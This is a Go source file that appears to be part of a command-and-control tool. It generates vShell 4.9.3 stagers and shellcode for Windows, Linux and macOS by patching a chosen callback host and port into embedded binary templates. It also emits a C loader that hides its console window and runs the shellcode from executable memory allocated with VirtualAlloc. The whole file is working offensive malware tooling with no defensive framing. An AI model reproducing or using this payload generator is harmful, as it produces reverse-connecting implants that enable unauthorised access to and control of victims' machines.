package stage

import (
	"embed"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"
)

// The stage launchers are recovered, deterministic vShell 4.9.3 templates.
// Differential generation against two listener addresses identified the only
// variable bytes as the 32-byte host buffer and the two-byte network-order port.
//
//go:embed assets/*
var assets embed.FS

type descriptor struct {
	asset     string
	host      int
	hostParts []int
	port      int
}

var stageTemplates = map[string]descriptor{
	"windows_amd64.exe": {asset: "assets/windows_amd64.exe.stage", hostParts: []int{1493, 1509, 1523, 1535, 1547, 1559, 1571, 1583}, port: 1761},
	"windows_i386.exe":  {asset: "assets/windows_i386.exe.stage", hostParts: []int{1245, 1270, 1283, 1295, 1307, 1319, 1331, 1343}, port: 1521},
	"linux_amd64":       {asset: "assets/linux_amd64.stage", host: 3328, port: 2475},
	"linux_i386":        {asset: "assets/linux_i386.stage", host: 2700, port: 1831},
	"linux_arm64":       {asset: "assets/linux_arm64.stage", host: 3523, port: 3520},
	"linux_arm":         {asset: "assets/linux_arm.stage", host: 2323, port: 2320},
	"darwin_amd64":      {asset: "assets/darwin_amd64.stage", host: 16249, port: 15206},
	"darwin_arm64":      {asset: "assets/darwin_arm64.stage", host: 16249, port: 16308},
}

var shellcodeTemplates = map[string]descriptor{
	"windows_amd64": {asset: "assets/windows_amd64.shellcode", hostParts: []int{469, 485, 499, 511, 523, 535, 547, 559}, port: 737},
	"windows_i386":  {asset: "assets/windows_i386.shellcode", hostParts: []int{221, 246, 259, 271, 283, 295, 307, 319}, port: 497},
}

func Launcher(arch, connectAddr string) ([]byte, error) {
	d, ok := stageTemplates[arch]
	if !ok {
		return nil, fmt.Errorf("unsupported stage arch %q", arch)
	}
	return render(d, connectAddr)
}

func Shellcode(arch, connectAddr, format string) ([]byte, string, error) {
	d, ok := shellcodeTemplates[arch]
	if !ok {
		return nil, "", fmt.Errorf("unsupported shellcode arch %q", arch)
	}
	raw, err := render(d, connectAddr)
	if err != nil {
		return nil, "", err
	}
	switch format {
	case ".bin":
		return raw, "application/octet-stream", nil
	case ".raw.txt":
		out := make([]byte, hex.EncodedLen(len(raw)))
		hex.Encode(out, raw)
		return out, "text/plain; charset=utf-8", nil
	case ".c":
		return cSource(raw), "text/plain; charset=utf-8", nil
	default:
		return nil, "", fmt.Errorf("unsupported shellcode format %q", format)
	}
}

func render(d descriptor, connectAddr string) ([]byte, error) {
	host, portText, err := net.SplitHostPort(connectAddr)
	if err != nil {
		return nil, fmt.Errorf("invalid connect address: %w", err)
	}
	port, err := strconv.Atoi(portText)
	if err != nil || port < 1 || port > 65535 {
		return nil, errors.New("invalid connect port")
	}
	if len(host) > 32 {
		return nil, errors.New("connect host exceeds 32 bytes")
	}
	data, err := assets.ReadFile(d.asset)
	if err != nil {
		return nil, err
	}
	data = append([]byte(nil), data...)
	if len(d.hostParts) != 0 {
		for _, off := range d.hostParts {
			clear(data[off : off+4])
		}
		for i := 0; i < len(host); i++ {
			off := d.hostParts[i/4] + i%4
			data[off] = host[i]
		}
	} else {
		clear(data[d.host : d.host+32])
		copy(data[d.host:d.host+32], host)
	}
	data[d.port] = byte(port >> 8)
	data[d.port+1] = byte(port)
	return data, nil
}

func cSource(raw []byte) []byte {
	var out strings.Builder
	out.Grow(len(raw)*4 + 512)
	out.WriteString("#include <iostream>\n#include \"stdio.h\"\n#include \"Windows.h\"\n#pragma comment(linker,\"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n\n")
	out.WriteString("unsigned char shellcode[] = \"")
	for _, b := range raw {
		fmt.Fprintf(&out, "\\x%02x", b)
	}
	out.WriteString("\";\n\nvoid main()\n{\n    LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    memcpy(Memory, shellcode, sizeof(shellcode));\n    ((void(*)())Memory)();\n}")
	return []byte(out.String())
}
